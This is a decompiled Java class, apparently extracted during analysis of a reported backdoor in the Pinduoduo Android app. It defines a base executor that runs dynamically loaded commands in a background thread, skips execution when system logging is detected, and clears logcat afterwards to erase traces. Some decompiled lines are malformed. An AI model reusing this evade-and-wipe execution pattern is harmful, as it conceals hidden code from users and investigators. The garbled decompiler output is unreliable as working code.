package com.google.android.sd.biz_dynamic_dex.base;

import android.content.Context;
import com.google.android.sd.utils.Utils;

public abstract class DynamicCmdExecutor {
  public final void execute(final Context context, final String input) {
    try {
      preExecute(context, input);
      Utils.runInNewThread(new Runnable() {
            public void run() {
              try {
                DynamicCmdExecutor.this.realExecute(context, input);
              } finally {
                Exception exception;
              } 
              Utils.clearLogcat();
            }
          });
    } finally {}
    Utils.clearLogcat();
  }
  
  protected boolean isReadyToExecute(Context paramContext) {
    return !Utils.isSystemLogging(paramContext);
  }
  
  protected void preExecute(Context paramContext, String paramString) throws Exception {}
  
  protected abstract void realExecute(Context paramContext, String paramString) throws Exception;
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\f4247da0-6274-44eb-859a-b4c35ec0dd71-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\DynamicCmdExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */